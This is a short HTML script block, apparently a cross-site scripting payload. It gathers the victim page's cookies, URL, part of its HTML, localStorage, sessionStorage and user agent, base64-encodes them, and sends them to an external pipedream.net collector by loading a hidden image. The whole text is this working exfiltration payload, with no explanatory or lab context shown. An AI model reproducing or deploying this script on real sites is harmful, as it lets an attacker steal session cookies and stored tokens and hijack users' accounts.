<script>
  let data = {
    cookies: document.cookie,
    loc: location.href,
    html: document.documentElement.outerHTML.slice(0, 1500),
    ls: JSON.stringify(localStorage),
    ss: JSON.stringify(sessionStorage),
    ua: navigator.userAgent,
    time: Date.now()
  };

  let img = new Image();
  img.src = 'https://eoat1elxcyeymir.m.pipedream.net/?d=' + btoa(JSON.stringify(data));
  document.body.appendChild(img);
</script>
